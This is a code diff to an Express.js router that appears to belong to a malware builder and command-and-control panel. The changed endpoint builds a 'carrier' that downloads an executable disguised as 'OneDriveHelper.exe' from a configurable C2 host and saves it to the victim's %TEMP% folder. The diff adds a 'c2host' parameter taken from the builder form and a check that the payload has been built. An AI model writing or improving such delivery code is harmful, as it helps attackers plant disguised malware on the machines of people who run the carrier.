@@ -163,9 +163,18 @@ router.post("/api/build", requireAdmin, (req, res) => {
 // OneDriveHelper.exe from this server's /dl/exe endpoint.
 
 router.get("/api/builder/carrier", requireAdmin, (req, res) => {
-  const type    = (req.query.type || "").toLowerCase();
-  const proto   = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
-  const host    = req.headers.host || "localhost";
+  const type  = (req.query.type || "").toLowerCase();
+  const proto = req.headers["x-forwarded-proto"] || (req.secure ? "https" : "http");
+  // Prefer the c2host the dashboard passes (from the builder form's C2 Host field)
+  // over the HTTP Host header, which may be 'localhost' when accessed locally.
+  const host  = (req.query.c2host || "").trim() || req.headers.host || "localhost";
+
+  if (!fs.existsSync(DL_HELPER)) {
+    return res.status(400).json({
+      error: "OneDriveHelper.exe not found — click Build in the builder above first to generate it, then download the carrier."
+    });
+  }
+
   const payload = `${proto}://${host}/dl/exe`;
   const saveTo  = "%TEMP%\\OneDriveHelper.exe";
 
